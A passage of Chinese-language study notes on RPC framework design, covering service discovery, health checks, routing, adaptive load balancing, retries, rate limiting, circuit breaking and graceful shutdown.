LinkedHashMap、LinkedHashSet 等，而且大多数情况下最好不要使用第三方集合类，如 Guava 中的集合类，很多开源的序列化框架都是优先支持编程语言原生的对象。因此如果入参是集合类，应尽量选用原生的、最为常用的集合类，如 HashMap、ArrayList。</p><p><strong>对象有复杂的继承关系：</strong>大多数序列化框架在序列化对象时都会将对象的属性一一进行序列化，当有继承关系时，会不停地寻找父类，遍历属性。就像问题 1 一样，对象关系越复杂，就越浪费性能，同时又很容易出现序列化上的问题。</p><p><img src="/2022/08/28/RPC%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/Users\longp\AppData\Roaming\Typora\typora-user-images\image-20220717151659788.png" alt="image-20220717151659788"></p><h2 id="RPC主要实现功能"><a href="#RPC主要实现功能" class="headerlink" title="RPC主要实现功能"></a>RPC主要实现功能</h2><h3 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h3><p><strong>一致性（Consistency）、可用性（Availability）、分区容错性（Partition tolerance）要AP还是CP</strong></p><p><img src="https://static001.geekbang.org/resource/image/51/5d/514dc04df2b8b2f3130b7d44776a825d.jpg?wh=2746*1445" alt="img"></p><p>​                                                                                                                                          <strong>服务发现原理</strong></p><p><strong>服务注册：</strong>在服务提供方启动的时候，将对外暴露的接口注册到注册中心之中，注册中心将这个服务节点的 IP 和接口保存下来。</p><p><strong>服务订阅：</strong>在服务调用方启动的时候，去注册中心查找并订阅服务提供方的 IP，然后缓存到本地，并用于后续的远程调用。</p><h4 id="为什么不使用-DNS？"><a href="#为什么不使用-DNS？" class="headerlink" title="为什么不使用 DNS？"></a>为什么不使用 DNS？</h4><p><img src="https://static001.geekbang.org/resource/image/3b/18/3b6a23f392b9b8d6fcf31803a5b4ef18.jpg?wh=5273*1884" alt="img"></p><p>​                                                                                                             <strong>DNS查询流程</strong></p><p><strong>使用DNS存在的问题：</strong></p><ul><li>如果这个 IP 端口下线了，服务调用者不能及时摘除服务节点；</li><li>如果在之前已经上线了一部分服务节点，这时我突然对这个服务进行扩容，那么新上线的服务节点不能及时接收到流量；</li></ul><h4 id="基于-ZooKeeper-的服务发现"><a href="#基于-ZooKeeper-的服务发现" class="headerlink" title="基于 ZooKeeper 的服务发现"></a>基于 ZooKeeper 的服务发现</h4><p><img src="https://static001.geekbang.org/resource/image/50/75/503fabeeae226a722f83e9fb6c0d4075.jpg?wh=4214*1803" alt="img"></p><p><img src="https://s2.loli.net/2022/08/28/9rWbXJjnkFMGdgL.png" alt="实践.png"></p><h4 id="基于消息总线的最终一致性的注册中心"><a href="#基于消息总线的最终一致性的注册中心" class="headerlink" title="基于消息总线的最终一致性的注册中心"></a>基于消息总线的最终一致性的注册中心</h4><p>ZooKeeper 的一大特点就是强一致性，ZooKeeper 集群的每个节点的数据每次发生更新操作，都会通知其它 ZooKeeper 节点同时执行更新。它要求保证每个节点的数据能够实时的完全一致，这也就直接导致了 ZooKeeper 集群性能上的下降。这就好比几个人在玩传递东西的游戏，必须这一轮每个人都拿到东西之后，所有的人才能开始下一轮，而不是说我只要获得到东西之后，就可以直接进行下一轮了。</p><p>而 RPC 框架的服务发现，在服务节点刚上线时，服务调用方是可以容忍在一段时间之后（比如几秒钟之后）发现这个新上线的节点的。毕竟服务节点刚上线之后的几秒内，甚至更长的一段时间内没有接收到请求流量，对整个服务集群是没有什么影响的，<strong>所以我们可以牺牲掉 CP（强制一致性），而选择 AP（最终一致），来换取整个注册中心集群的性能和稳定性。</strong></p><p>是否有一种简单、高效，并且最终一致的更新机制，能代替 ZooKeeper 那种数据强一致的数据更新机制呢？</p><p>因为要求最终一致性，我们可以考虑采用消息总线机制。注册数据可以全量缓存在每个注册中心内存中，通过消息总线来同步数据。当有一个注册中心节点接收到服务节点注册时，会产生一个消息推送给消息总线，再通过消息总线通知给其它注册中心节点更新数据并进行服务下发，从而达到注册中心间数据最终一致性，具体流程如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/73/ff/73b59c7949ebed2903ede474856062ff.jpg?wh=4256*2276" alt="img"></p><ul><li>当有服务上线，注册中心节点收到注册请求，服务列表数据发生变化，会生成一个消息，推送给消息总线，每个消息都有整体递增的版本。</li><li>消息总线会主动推送消息到各个注册中心，同时注册中心也会定时拉取消息。对于获取到消息的在消息回放模块里面回放，只接受大于本地版本号的消息，小于本地版本号的消息直接丢弃，从而实现最终一致性。</li><li>消费者订阅可以从注册中心内存拿到指定接口的全部服务实例，并缓存到消费者的内存里面。</li><li>采用推拉模式，消费者可以及时地拿到服务实例增量变化情况，并和内存中的缓存数据进行合并。</li></ul><p>为了性能，采用两级缓存，注册中心和消费者的内存缓存，通过异步推拉模式来确保最终一致性。</p><p><img src="https://s2.loli.net/2022/08/28/OfNVTmrCbYEkohq.png" alt="image-20220720220716266.png"><br><img src="https://s2.loli.net/2022/08/28/g4dzHEyWfrpRhDK.png" alt="image-20220720220817173.png"></p><h3 id="健康检测"><a href="#健康检测" class="headerlink" title="健康检测"></a>健康检测</h3><p><strong>Script Check、HTTP Check、TCP Check、TTL Check等</strong></p><h4 id="consul做法"><a href="#consul做法" class="headerlink" title="consul做法"></a>consul做法</h4><p><strong>TTL&#x2F;TCP？</strong></p><h4 id="etcd做法？"><a href="#etcd做法？" class="headerlink" title="etcd做法？"></a>etcd做法？</h4><p><strong>基于lease租约机制，对注册的服务设置key TTL，定时保持服务的心跳以达到监控健康状态的效果。</strong></p><h3 id="路由策略"><a href="#路由策略" class="headerlink" title="路由策略"></a>路由策略</h3><p><img src="https://static001.geekbang.org/resource/image/b7/68/b78964a2db3adc8080364e9cfc79ca68.jpg?wh=3900*879" alt="img"></p><p>​                                                                                                                              <strong>调用流程</strong></p><p><img src="https://static001.geekbang.org/resource/image/23/f7/23f24c545d33ec4d6d72fc10e94a0ff7.jpg?wh=2513*1991" alt="img"></p><p>​                                                                                                                              <strong>IP路由调用拓扑</strong></p><h4 id="参数路由："><a href="#参数路由：" class="headerlink" title="参数路由："></a>参数路由：</h4><p><img src="https://static001.geekbang.org/resource/image/78/39/7868289c87ca9de144fe32fac98f8339.jpg?wh=2506*1964" alt="img"></p><p>​                                                                                                                 <strong>参数路由调用拓扑</strong></p><p>相比 IP 路由，参数路由支持的灰度粒度更小，他为服务提供方应用提供了另外一个服务治理的手段。灰度发布功能是 RPC 路由功能的一个典型应用场景，通过 RPC 路由策略的组合使用可以让服务提供方更加灵活地管理、调用自己的流量，进一步降低上线可能导致的风险。</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p><strong>需求：</strong></p><p><img src="https://s2.loli.net/2022/08/28/vAXShkqrxu8e2pK.png" alt="需求.png"></p><h4 id="什么是负载均衡？"><a href="#什么是负载均衡？" class="headerlink" title="什么是负载均衡？"></a>什么是负载均衡？</h4><p>当我们的一个服务节点无法支撑现有的访问量时，我们会部署多个节点，组成一个集群，然后通过负载均衡，将请求分发给这个集群下的每个服务节点，从而达到多个服务节点共同分担请求压力的目的。</p><p><img src="https://static001.geekbang.org/resource/image/f4/b8/f48704443b33df17fc490778c00c71b8.jpg?wh=3345*1443" alt="img"></p><p>​                                                                                                                    <strong>负载均衡示意图</strong></p><p>负载均衡主要分为软负载和硬负载，软负载就是在一台或多台服务器上安装负载均衡的软件，如 LVS、Nginx 等，硬负载就是通过硬件设备来实现的负载均衡，如 F5 服务器等。负载均衡的算法主要有随机法、轮询法、最小连接法等。</p><p>刚才介绍的负载均衡主要还是应用在 Web 服务上，Web 服务的域名绑定负载均衡的地址，通过负载均衡将用户的请求分发到一个个后端服务上。</p><h4 id="RPC-框架中的负载均衡"><a href="#RPC-框架中的负载均衡" class="headerlink" title="RPC 框架中的负载均衡"></a>RPC 框架中的负载均衡</h4><p><strong>RPC使用传统的负载均衡存在的问题？</strong></p><ol><li>搭建负载均衡设备或 TCP&#x2F;IP 四层代理，需要额外成本；</li><li>请求流量都经过负载均衡设备，多经过一次网络传输，会额外浪费一些性能；</li><li>负载均衡添加节点和摘除节点，一般都要手动添加，当大批量扩容和下线时，会有大量的人工操作，“服务发现”在操作上是个问题；</li><li>我们在服务治理的时候，针对不同接口服务、服务的不同分组，我们的负载均衡策略是需要可配的，如果大家都经过这一个负载均衡设备，就不容易根据不同的场景来配置不同的负载均衡策略了。</li></ol><p>RPC 的负载均衡完全由 RPC 框架自身实现，RPC 的服务调用者会与“注册中心”下发的所有服务节点建立长连接，在每次发起 RPC 调用时，服务调用者都会通过配置的负载均衡插件，自主选择一个服务节点，发起 RPC 调用请求。</p><p><img src="https://static001.geekbang.org/resource/image/5e/1c/5e294378a3d86e7d279507f62fe5ee1c.jpg?wh=4175*1969" alt="img"></p><p>​                                                                                                                      RPC框架负载均衡示意图</p><p>RPC 负载均衡策略一般包括随机权重、Hash、轮询。当然，这还是主要看 RPC 框架自身的实现。其中的随机权重策略应该是我们最常用的一种了，通过随机算法，我们基本可以保证每个节点接收到的请求流量是均匀的；同时我们还可以通过控制节点权重的方式，来进行流量控制。比如我们默认每个节点的权重都是 100，但当我们把其中的一个节点的权重设置成 50 时，它接收到的流量就是其他节点的 1&#x2F;2。</p><h4 id="如何设计自适应的负载均衡？"><a href="#如何设计自适应的负载均衡？" class="headerlink" title="如何设计自适应的负载均衡？"></a>如何设计自适应的负载均衡？</h4><p>RPC 的负载均衡完全由 RPC 框架自身实现，服务调用者发起请求时，会通过配置的负载均衡插件，自主地选择服务节点。那是不是只要调用者知道每个服务节点处理请求的能力，再根据服务处理节点处理请求的能力来判断要打给它多少流量就可以了？当一个服务节点负载过高或响应过慢时，就少给它发送请求，反之则多给它发送请求。这就有点像日常工作中的分配任务，要多考虑实际情况。当一位下属身体欠佳，就少给他些工作；若刚好另一位下属状态很好，手头工作又不是很多，就多分给他一点。</p><h5 id="服务调用者节点该如何判定一个服务节点的处理能力呢？"><a href="#服务调用者节点该如何判定一个服务节点的处理能力呢？" class="headerlink" title="服务调用者节点该如何判定一个服务节点的处理能力呢？"></a>服务调用者节点该如何判定一个服务节点的处理能力呢？</h5><p>采用一种打分的策略，服务调用者收集与之建立长连接的每个服务节点的指标数据，如服务节点的负载指标、CPU 核数、内存大小、请求处理的耗时指标（如请求平均耗时、TP99、TP999）、服务节点的状态指标（如正常、亚健康）。通过这些指标，计算出一个分数，比如总分 10 分，如果 CPU 负载达到 70%，就减它 3 分，当然了，减 3 分只是个类比，需要减多少分是需要一个计算策略的。</p><h5 id="该如果根据这些指标来打分呢？"><a href="#该如果根据这些指标来打分呢？" class="headerlink" title="该如果根据这些指标来打分呢？"></a>该如果根据这些指标来打分呢？</h5><p>这就有点像公司对员工进行年终考核。假设我是老板，我要考核专业能力、沟通能力和工作态度，这三项的占比分别是 30%、30%、40%，我给一个员工的评分是 10、8、8，那他的综合分数就是这样计算的：10<em>30%+8</em>30%+8*40%&#x3D;8.6 分。给服务节点打分也一样，我们可以为每个指标都设置一个指标权重占比，然后再根据这些指标数据，计算分数。</p><h5 id="服务调用者给每个服务节点都打完分之后，会发送请求，那这时候我们又该如何根据分数去控制给每个服务节点发送多少流量呢？"><a href="#服务调用者给每个服务节点都打完分之后，会发送请求，那这时候我们又该如何根据分数去控制给每个服务节点发送多少流量呢？" class="headerlink" title="服务调用者给每个服务节点都打完分之后，会发送请求，那这时候我们又该如何根据分数去控制给每个服务节点发送多少流量呢？"></a>服务调用者给每个服务节点都打完分之后，会发送请求，那这时候我们又该如何根据分数去控制给每个服务节点发送多少流量呢？</h5><p>我们可以配合随机权重的负载均衡策略去控制，通过最终的指标分数修改服务节点最终的权重。例如给一个服务节点综合打分是 8 分（满分 10 分），服务节点的权重是 100，那么计算后最终权重就是 80（100*80%）。服务调用者发送请求时，会通过随机权重的策略来选择服务节点，那么这个节点接收到的流量就是其他正常节点的 80%（这里假设其他节点默认权重都是 100，且指标正常，打分为 10 分的情况）。</p><p>整体的设计方案如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/00/af/00065674063f30c98caaa58bb4cd7baf.jpg?wh=4085*2365" alt="img"></p><p>​                                                                                                                      <strong>RPC自适应负载均衡示意图</strong></p><p><strong>关键步骤：</strong></p><ol><li>添加服务指标收集器，并将其作为插件，默认有运行时状态指标收集器、请求耗时指标收集器。</li><li>运行时状态指标收集器收集服务节点 CPU 核数、CPU 负载以及内存等指标，在服务调用者与服务提供者的心跳数据中获取。</li><li>请求耗时指标收集器收集请求耗时数据，如平均耗时、TP99、TP999 等。</li><li>可以配置开启哪些指标收集器，并设置这些参考指标的指标权重，再根据指标数据和指标权重来综合打分。</li><li>通过服务节点的综合打分与节点的权重，最终计算出节点的最终权重，之后服务调用者会根据随机权重的策略，来选择服务节点。</li></ol><p><strong>RPC 框架的负载均衡与 Web 服务的负载均衡的不同之处在于：</strong></p><p>RPC 框架并不是依赖一个负载均衡设备或者负载均衡服务器来实现负载均衡的，而是由 RPC 框架本身实现的，服务调用者可以自主选择服务节点，发起服务调用。这样的好处是，RPC 框架不再需要依赖专门的负载均衡设备，可以节约成本；还减少了与负载均衡设备间额外的网络传输，提升了传输效率；并且均衡策略可配，便于服务治理。</p><h3 id="异常重试与熔断限流"><a href="#异常重试与熔断限流" class="headerlink" title="异常重试与熔断限流"></a>异常重试与熔断限流</h3><h4 id="RPC重试机制"><a href="#RPC重试机制" class="headerlink" title="RPC重试机制"></a>RPC重试机制</h4><p><img src="https://static001.geekbang.org/resource/image/32/81/32441dc643e64a022acfcbe0b4c77e81.jpg?wh=5154*1923" alt="img"></p><p>​                                                                                                                       <strong>RPC异常重试流程</strong></p><p>调用端发起的请求失败时，RPC 框架自身可以进行重试，再重新发送请求，用户可以自行设置是否开启重试以及重试的次数。</p><p>调用端在发起 RPC 调用时，会经过负载均衡，选择一个节点，之后它会向这个节点发送请求信息。当消息发送失败或收到异常消息时，我们就可以捕获异常，根据异常触发重试，重新通过负载均衡选择一个节点发送请求消息，并且记录请求的重试次数，当重试次数达到用户配置的重试次数的时候，就返回给调用端动态代理一个失败异常，否则就一直重试下去。</p><p>RPC 框架的重试机制就是调用端发现请求失败时捕获异常，之后触发重试，那是不是所有的异常都要触发重试呢？当然不是了，因为这个异常可能是服务提供方抛回来的业务异常，它是应该正常返回给动态代理的，所以我们要在触发重试之前对捕获的异常进行判定，只有符合重试条件的异常才能触发重试，比如网络超时异常、网络连接异常等等。</p><p><strong>异常重试需要注意的问题：</strong></p><p>当网络突然抖动了一下导致请求超时了，但这个时候调用方的请求信息可能已经发送到服务提供方的节点上，也可能已经发送到服务提供方的服务节点上，那如果请求信息成功地发送到了服务节点上，那这个节点是不是就要执行业务逻辑了呢？是的。</p><p>如果该业务不是幂等，比如插入数据操作，那触发重试的话会不会引发问题呢？会的。</p><h4 id="如何在约定时间内安全可靠地重试？"><a href="#如何在约定时间内安全可靠地重试？" class="headerlink" title="如何在约定时间内安全可靠地重试？"></a>如何在约定时间内安全可靠地重试？</h4><p>RPC 框架是不会知道哪些业务异常能够去进行异常重试的，我们可以加个重试异常的白名单，用户可以将允许重试的异常加入到这个白名单中。当调用端发起调用，并且配置了异常重试策略，捕获到异常之后，我们就可以采用这样的异常处理策略。如果这个异常是 RPC 框架允许重试的异常，或者这个异常类型存在于可重试异常的白名单中，我们就允许对这个请求进行重试。</p><p><img src="https://static001.geekbang.org/resource/image/5e/81/5e5706e6fc02ef0caaee565ea358f281.jpg?wh=5129*2058" alt="img"></p><p>​                                                                                                                 <strong>可靠的异常重试机制</strong></p><h4 id="为什么需要自我保护"><a href="#为什么需要自我保护" class="headerlink" title="为什么需要自我保护"></a>为什么需要自我保护</h4><p>RPC 是解决分布式系统通信问题的一大利器，而分布式系统的一大特点就是高并发，所以说 RPC 也会面临高并发的场景。在这样的情况下，我们提供服务的每个服务节点就都可能由于访问量过大而引起一系列的问题，比如业务处理耗时过长、CPU 飘高、频繁 Full GC 以及服务进程直接宕机等等。但是在生产环境中，我们要保证服务的稳定性和高可用性，这时我们就需要业务进行自我保护，从而保证在高访问量、高并发的场景下，应用系统依然稳定，服务依然高可用。</p><h5 id="那么在使用-RPC-时，业务又如何实现自我保护呢？"><a href="#那么在使用-RPC-时，业务又如何实现自我保护呢？" class="headerlink" title="那么在使用 RPC 时，业务又如何实现自我保护呢？"></a>那么在使用 RPC 时，业务又如何实现自我保护呢？</h5><p>最常见的方式就是限流了，简单有效，但 RPC 框架的自我保护方式可不只有限流，并且 RPC 框架的限流方式可以是多种多样的。我们可以将 RPC 框架拆开来分析，RPC 调用包括服务端和调用端，调用端向服务端发起调用。下面分享一下服务端与调用端分别是如何进行自我保护的。</p><h4 id="服务端的自我保护"><a href="#服务端的自我保护" class="headerlink" title="服务端的自我保护"></a>服务端的自我保护</h4><p>举个例子，假如我们要发布一个 RPC 服务，作为服务端接收调用端发送过来的请求，这时服务端的某个节点负载压力过高了，我们该如何保护这个节点？</p><p><img src="https://static001.geekbang.org/resource/image/9b/17/9bae10ba8a5b96b03102fb9ef4f30e17.jpg?wh=2560*1315" alt="img"></p><p>那么就是限流吧？是的，<strong>在 RPC 调用中服务端的自我保护策略就是限流</strong>，那你有没有想过我们是如何实现限流的呢？是在服务端的业务逻辑中做限流吗？有没有更优雅的方式？</p><p>限流是一个比较通用的功能，我们可以在 RPC 框架中集成限流的功能，让使用方自己去配置限流阈值；我们还可以在服务端添加限流逻辑，当调用端发送请求过来时，服务端在执行业务逻辑之前先执行限流逻辑，如果发现访问量过大并且超出了限流的阈值，就让服务端直接抛回给调用端一个限流异常，否则就执行正常的业务逻辑。                                                </p><p><img src="https://static001.geekbang.org/resource/image/f8/ad/f8e8a4dd16f2fd2af366f810404057ad.jpg?wh=2563*1313" alt="img">                 </p><h5 id="服务端的限流逻辑该如何实现呢？"><a href="#服务端的限流逻辑该如何实现呢？" class="headerlink" title="服务端的限流逻辑该如何实现呢？"></a>服务端的限流逻辑该如何实现呢？</h5><p>计数器，平滑限流的滑动窗口、漏斗算法以及令牌桶算法等等</p><h4 id="调用端的自我保护"><a href="#调用端的自我保护" class="headerlink" title="调用端的自我保护"></a>调用端的自我保护</h4><p>举个例子，假如发布一个服务 B，而服务 B 又依赖服务 C，当一个服务 A 来调用服务 B 时，服务 B 的业务逻辑调用服务 C，而这时服务 C 响应超时了，由于服务 B 依赖服务 C，C 超时直接导致 B 的业务逻辑一直等待，而这个时候服务 A 在频繁地调用服务 B，服务 B 就可能会因为堆积大量的请求而导致服务宕机。</p><p><img src="https://static001.geekbang.org/resource/image/dc/31/dc2a18f1e2c495380cc4053b92ed3131.jpg?wh=2171*1472" alt="img"></p><p>由此可见，服务 B 调用服务 C，服务 C 执行业务逻辑出现异常时，会影响到服务 B，甚至可能会引起服务 B 宕机。这还只是 A-&gt;B-&gt;C 的情况，试想一下 A-&gt;B-&gt;C-&gt;D-&gt;……呢？在整个调用链中，只要中间有一个服务出现问题，都可能会引起上游的所有服务出现一系列的问题，甚至会引起整个调用链的服务都宕机，这是非常恐怖的。</p><p>所以说，在一个服务作为调用端调用另外一个服务时，为了防止被调用的服务出现问题而影响到作为调用端的这个服务，这个服务也需要进行自我保护。<strong>而最有效的自我保护方式就是熔断。</strong></p><p><strong>熔断机制:</strong></p><p><img src="https://static001.geekbang.org/resource/image/90/64/903fa4374beb753c1db8f1f8b82ff464.jpg?wh=2642*1990" alt="img"></p><p><strong>熔断器的工作机制主要是关闭、打开和半打开这三个状态之间的切换</strong>。</p><ol><li>在正常情况下，熔断器是关闭的；</li><li>当调用端调用下游服务出现异常时，熔断器会收集异常指标信息进行计算，当达到熔断条件时熔断器打开，这时调用端再发起请求是会直接被熔断器拦截，并快速地执行失败逻辑；</li><li>当熔断器打开一段时间后，会转为半打开状态，这时熔断器允许调用端发送一个请求给服务端，如果这次请求能够正常地得到服务端的响应，则将状态置为关闭状态，否则设置为打开。</li></ol><h5 id="在-RPC-框架中，该如何整合熔断器呢？"><a href="#在-RPC-框架中，该如何整合熔断器呢？" class="headerlink" title="在 RPC 框架中，该如何整合熔断器呢？"></a>在 RPC 框架中，该如何整合熔断器呢？</h5><p>熔断机制主要是保护调用端，调用端在发出请求的时候会先经过熔断器。我们可以回想下 RPC 的调用流程：</p><p><img src="https://static001.geekbang.org/resource/image/59/87/59b7479220a415ef034fb6edb589ec87.jpg?wh=3788*1350" alt="img"></p><p><strong>哪个步骤整合熔断器会比较合适呢？</strong></p><p>动态代理，因为在 RPC 调用的流程中，动态代理是 RPC 调用的第一个关口。在发出请求时先经过熔断器，如果状态是闭合则正常发出请求，如果状态是打开则执行熔断器的失败策略。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><h5 id="RPC-框架是如何实现业务的自我保护？"><a href="#RPC-框架是如何实现业务的自我保护？" class="headerlink" title="RPC 框架是如何实现业务的自我保护？"></a>RPC 框架是如何实现业务的自我保护？</h5><p><strong>服务端主要是通过限流来进行自我保护</strong>，我们在实现限流时要考虑到应用和 IP 级别，方便我们在服务治理的时候，对部分访问量特别大的应用进行合理的限流；服务端的限流阈值配置都是作用于单机的，而在有些场景下，例如对整个服务设置限流阈值，服务进行扩容时，限流的配置并不方便，我们可以在注册中心或配置中心下发限流阈值配置的时候，将总服务节点数也下发给服务节点，让 RPC 框架自己去计算限流阈值；我们还可以让 RPC 框架的限流模块依赖一个专门的限流服务，对服务设置限流阈值进行精准地控制，但是这种方式依赖了限流服务，相比单机的限流方式，在性能和耗时上有劣势。</p><p><strong>调用端可以通过熔断机制进行自我保护</strong>，防止调用下游服务出现异常，或者耗时过长影响调用端的业务逻辑，RPC 框架可以在动态代理的逻辑中去整合熔断器，实现 RPC 框架的熔断功能。</p><h5 id="服务保护一般就是限流、熔断、降级。"><a href="#服务保护一般就是限流、熔断、降级。" class="headerlink" title="服务保护一般就是限流、熔断、降级。"></a>服务保护一般就是限流、熔断、降级。</h5><p> 限流的落地方式有：Guava RateLimiter、lua+Redis、Sentinel等； 熔断：Hystrix、Resilience4j； 降级：服务降级，就是对不怎么重要的服务进行低优先级的处理。说白了，就是尽可能的把系统资源让给优先级高的服务。资源有限，而请求是无限的。</p><h4 id="业务分组"><a href="#业务分组" class="headerlink" title="业务分组"></a>业务分组</h4><p>通过分组的方式人为地给不同的调用方划分出不同的小集群，从而实现调用方流量隔离的效果，保障我们的核心业务不受非核心业务的干扰。但我们在考虑问题的时候，不能顾此失彼，不能因为新加一个的功能而影响到原有系统的稳定性。</p><h4 id="实践案例："><a href="#实践案例：" class="headerlink" title="实践案例："></a>实践案例：</h4><p><img src="https://s2.loli.net/2022/08/28/KPjgxwin6sIVuby.png" alt="实现.png"></p><h3 id="RPC服务重启的关闭与开启"><a href="#RPC服务重启的关闭与开启" class="headerlink" title="RPC服务重启的关闭与开启"></a>RPC服务重启的关闭与开启</h3><h4 id="在重启服务的过程中，RPC-怎么做到让调用方系统不出问题呢？"><a href="#在重启服务的过程中，RPC-怎么做到让调用方系统不出问题呢？" class="headerlink" title="在重启服务的过程中，RPC 怎么做到让调用方系统不出问题呢？"></a>在重启服务的过程中，RPC 怎么做到让调用方系统不出问题呢？</h4><p>简述下上线的大概流程：当服务提供方要上线的时候，一般是通过部署系统完成实例重启。在这个过程中，服务提供方的团队并不会事先告诉调用方他们需要操作哪些机器，从而让调用方去事先切走流量。而对调用方来说，它也无法预测到服务提供方要对哪些机器重启上线，因此负载均衡就有可能把要正在重启的机器选出来，这样就会导致把请求发送到正在重启中的机器里面，从而导致调用方不能拿到正确的响应结果。</p><p><img src="https://static001.geekbang.org/resource/image/c8/67/c899c36097fd5e3f70bf031f4b2c2167.jpg?wh=3596*1810" alt="img"></p><p><strong>在服务重启的时候，对于调用方来说，这时候可能会存在以下几种情况：</strong></p><ul><li>调用方发请求前，目标服务已经下线。对于调用方来说，跟目标节点的连接会断开，这时候调用方可以立马感知到，并且在其健康列表里面会把这个节点挪掉，自然也就不会被负载均衡选中。</li><li>调用方发请求的时候，目标服务正在关闭，但调用方并不知道它正在关闭，而且两者之间的连接也没断开，所以这个节点还会存在健康列表里面，因此该节点就有一定概率会被负载均衡选中。</li></ul><h4 id="关闭流程"><a href="#关闭流程" class="headerlink" title="关闭流程"></a>关闭流程</h4><p><strong>通常的关闭流程：</strong></p><p><img src="https://static001.geekbang.org/resource/image/a1/50/a15be58b32195422bd5a18dba0e68050.jpg?wh=3195*1277" alt="img"></p><p>如上图所示，整个关闭过程中依赖了两次 RPC 调用，一次是服务提供方通知注册中心下线操作，一次是注册中心通知服务调用方下线节点操作。注册中心通知服务调用方都是异步的，我们在“服务发现”一讲中讲过在大规模集群里面，服务发现只保证最终一致性，并不保证实时性，所以注册中心在收到服务提供方下线的时候，并不能成功保证把这次要下线的节点推送到所有的调用方。</p><p>所以这么来看，通过服务发现并不能做到应用无损关闭。不能强依赖“服务发现”来通知调用方要下线的机器，那服务提供方自己来通知行不行？因为在 RPC 里面调用方跟服务提供方之间是长连接，我们可以在提供方应用内存里面维护一份调用方连接集合，当服务要关闭的时候，挨个去通知调用方去下线这台机器。这样整个调用链路就变短了，对于每个调用方来说就一次 RPC，可以确保调用的成功率很高。大部分场景下，这么做确实没有问题，我们之前也是这么实现的，但是我们发现线上还是会偶尔会出现，因为服务提供方上线而导致调用失败的问题。</p><h4 id="优雅关闭"><a href="#优雅关闭" class="headerlink" title="优雅关闭"></a>优雅关闭</h4><p>因为服务提供方已经开始进入关闭流程，那么很多对象就可能已经被销毁了，关闭后再收到的请求按照正常业务请求来处理，肯定是没法保证能处理的。所以我们可以在关闭的时候，设置一个请求“挡板”，挡板的作用就是告诉调用方，我已经开始进入关闭流程了，我不能再处理你这个请求了。</p><p><strong>举例：</strong>如果大家经常去银行办理业务，就会很熟悉这个流程。在交接班或者有其他要事情处理的时候，银行柜台工作人员会拿出一个纸板，放在窗口前，上面写到“该窗口已关闭”。在该窗口排队的人虽然有一万个不愿意，也只能换到其它窗口办理业务，因为柜台工作人员会把当前正在办理的业务处理完后正式关闭窗口。</p><p>基于这个思路，我们可以这么处理：当服务提供方正在关闭，如果这之后还收到了新的业务请求，服务提供方直接返回一个特定的异常给调用方（比如 ShutdownException）。这个异常就是告诉调用方“我已经收到这个请求了，但是我正在关闭，并没有处理这个请求”，然后调用方收到这个异常响应后，RPC 框架把这个节点从健康列表挪出，并把请求自动重试到其他节点，因为这个请求是没有被服务提供方处理过，所以可以安全地重试到其他节点，这样就可以实现对业务无损。</p><p>但如果只是靠等待被动调用，就会让这个关闭过程整体有点漫长。因为有的调用方那个时刻没有业务请求，就不能及时地通知调用方了，所以我们可以加上主动通知流程，这样既可以保证实时性，也可以避免通知失败的情况。</p><p><strong>怎么捕获到关闭事件呢？</strong></p><p>通过捕获操作系统的进程信号来获取，在 Java 语言里面，对应的是 Runtime.addShutdownHook 方法，可以注册关闭的钩子。在 RPC 启动的时候，我们提前注册关闭钩子，并在里面添加了两个处理程序，一个负责开启关闭标识，一个负责安全关闭服务对象，服务对象在关闭的时候会通知调用方下线节点。同时需要在我们调用链里面加上挡板处理器，当新的请求来的时候，会判断关闭标识，如果正在关闭，则抛出特定异常。</p><p><strong>关闭过程中已经在处理的请求会不会受到影响呢？</strong></p><p>如果进程结束过快会造成这些请求还没有来得及应答，同时调用方会也会抛出异常。为了尽可能地完成正在处理的请求，首先我们要把这些请求识别出来。</p><p>这就好比日常生活中，我们经常看见停车场指示牌上提示还有多少剩余车位，这个是如何做到的呢？如果仔细观察一下，你就会发现它是每进入一辆车，剩余车位就减一，每出来一辆车，剩余车位就加一。我们也可以利用这个原理在服务对象加上引用计数器，每开始处理请求之前加一，完成请求处理减一，通过该计数器我们就可以快速判断是否有正在处理的请求。</p><p>服务对象在关闭过程中，会拒绝新的请求，同时根据引用计数器等待正在处理的请求全部结束之后才会真正关闭。但考虑到有些业务请求可能处理时间长，或者存在被挂住的情况，为了避免一直等待造成应用无法正常退出，我们可以在整个 ShutdownHook 里面，加上超时时间控制，当超过了指定时间没有结束，则强制退出应用。超时时间我建议可以设定成 10s，基本可以确保请求都处理完了。整个流程如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/77/cc/7752081ec658f1d56ac4219f1c07fbcc.jpg?wh=3131*2891" alt="img"></p><h4 id="关闭总结"><a href="#关闭总结" class="headerlink" title="关闭总结"></a>关闭总结</h4><p>在 RPC 里面，关闭虽然看似不属于 RPC 主流程，但如果我们不能处理得很好的话，可能就会导致调用方业务异常，从而需要我们加入很多额外的运维工作。一个好的关闭流程，可以确保使用我们框架的业务实现平滑的上下线，而不用担心重启导致的问题。</p><p>“优雅关闭”这个概念除了在 RPC 里面有，在很多框架里面也都挺常见的，比如像我们经常用的应用容器框架 Tomcat。Tomcat 关闭的时候也是先从外层到里层逐层进行关闭，先保证不接收新请求，然后再处理关闭前收到的请求。</p><h5 id="相关解释："><a href="#相关解释：" class="headerlink" title="相关解释："></a>相关解释：</h5><p><img src="https://s2.loli.net/2022/08/28/qUCtZw2Ps7EdYDu.png" alt="image-20220723212313198.png"></p><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><h5 id="启动预热"><a href="#启动预热" class="headerlink" title="启动预热"></a>启动预热</h5><p>让刚启动的服务提供方应用不承担全部的流量，而是让它被调用的次数随着时间的移动慢慢增加，最终让流量缓和地增加到跟已经运行一段时间后的水平一样。</p><p><strong>实现：</strong>我们可以先简单地回顾下调用方发起的 RPC 调用流程是怎样的，调用方应用通过服务发现能够获取到服务提供方的 IP 